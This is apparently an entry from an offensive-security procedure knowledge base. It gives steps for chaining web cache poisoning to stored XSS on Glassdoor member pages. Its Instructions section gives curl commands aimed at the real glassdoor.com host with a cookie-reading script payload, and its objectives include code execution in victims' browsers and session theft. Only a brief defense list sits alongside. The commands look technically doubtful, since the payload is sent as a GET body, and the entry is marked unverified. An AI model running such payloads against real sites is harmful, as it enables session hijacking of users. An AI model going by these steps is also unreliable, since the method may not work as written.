---
id: p-chain-cache-poisoning-xss
tags:
  - stored-xss
  - cache-poisoning
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/cache-poisoning-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.750Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Chain-Web-Cache-Poisoning-to-Stored-XSS

## Summary

This procedure chains web cache poisoning to stored XSS by caching a malicious JavaScript payload in a URL disguised with an image extension, allowing the payload to be served and executed on victim browsers accessing the affected page.

## Description

Following token exposure, attackers can poison the cache with XSS payloads by appending .jpeg to paths like /member/home/index.htm, using a timestamp query parameter. The lack of proper cache armor and headers allows the dynamic response with embedded script to be stored and served as if static, leading to script execution. This affects logged-in users on Glassdoor, enabling session hijacking or data theft. Resolution involved Cloudflare armor and Cache-Control headers.

## Requirements

1. Prior successful cache poisoning (e.g., from token exposure procedure).
2. Proxy tool for injecting payloads into requests.
3. Victim access to the targeted page for payload delivery.

## Defense

Defensive measures and detection strategies:

- Enforce strict cache key validation including query parameters.
- Sanitize and escape user-controlled inputs in cached responses.
- Use Content-Security-Policy (CSP) to block inline scripts.

## Objectives

1. Cache a malicious XSS payload in the web cache.
2. Serve the payload to victims for JavaScript execution.
3. Achieve arbitrary code execution on victim browsers.

## Instructions

### Step 1: Inject XSS Payload into Cache Request

**Context**: Craft a request to a member page with .jpeg extension to store the response containing an injected script, bypassing content-type checks.

**Command** ([[commands/cache-poisoning-xss-payload]]):
```bash
curl -X GET "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -d "<script>alert(document.cookie)</script>" -v
```

> The -d flag injects the payload. Verbose output shows 200 OK and cache headers. The timestamp (t=2021111121) helps in targeting specific caches.

### Step 2: Trigger and Verify XSS Execution

**Context**: Direct a victim to the poisoned page; the cache serves the payload, executing the script.

**Command** ([[commands/cache-poisoning-xss-payload]]):
```bash
curl -X GET "https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
```

> In a browser, load the URL; check console for alert or cookie theft. Success if script runs without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/cache-poisoning-xss-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- stored-xss
- cache-poisoning
